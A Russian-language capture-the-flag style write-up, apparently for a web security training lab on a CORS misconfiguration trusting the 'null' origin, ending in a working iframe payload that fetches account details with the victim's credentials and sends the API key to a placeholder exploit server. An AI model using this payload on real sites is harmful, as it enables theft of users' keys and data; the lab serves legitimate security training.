Этот веб-сайт имеет небезопасную конфигурацию CORS, поскольку он доверяет «нулевому» источнику.

Чтобы решить лабораторную работу, создайте JavaScript, который использует CORS для получения ключа API администратора и загрузки кода на ваш сервер эксплойтов. Лабораторная работа будет решена, когда вы успешно отправите ключ API администратора.

Вы можете войти в свою учетную запись, используя следующие учетные данные:`wiener:peter`

## Дано

- небезопасная конфигурация CORS, поскольку он доверяет «нулевому» источнику.
- учетная запись:`wiener:peter`
## Задача

- создать JavaScript, который использует CORS для получения ключа API администратора

# Решение

1. Смотрим запрос и проверяем его
![[Pasted image 20250324143344.png]]

2. Формирую код
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script> 
	var req = new XMLHttpRequest(); 
	req.onload = reqListener; 
	req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); 
	req.withCredentials = true; 
	req.send(); 
	
	function reqListener() 
	{ 
		location='https://наш-сайт-куда-нам-надо/log?key='+encodeURIComponent(this.responseText); 
	}; 
</script>">
</iframe>
```